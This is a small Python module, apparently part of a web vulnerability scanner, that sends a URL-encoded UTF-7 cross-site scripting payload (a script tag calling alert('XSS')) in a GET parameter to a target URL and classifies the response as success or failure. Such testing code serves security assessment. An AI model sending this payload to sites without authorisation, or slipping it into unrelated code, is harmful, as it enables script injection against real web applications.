import requests
import re
from .utils import make_request_with_timeout, process_attack_response


def attack_utf7(url, headers, pattern, success, fail, error):
    """
    UTF-7编码攻击测试
    """
    # 定义 UTF-7 解析攻击 payload（XSS 恶意代码的 UTF-7 编码）
    data = {
        "answer": "%2B%2Fv8%20%2BADw-SCRIPT%2BAD4-alert(%27XSS%27)%3B%2BADw-%2FSCRIPT%2BAD4-"
    }

    # 发送请求
    success_flag, response_or_error, status_code = make_request_with_timeout(
        url, headers, method='GET', params=data
    )
    
    # 处理响应
    return process_attack_response(
        "UTF-7编码", success_flag, response_or_error, status_code, 
        pattern, success, fail, error
    )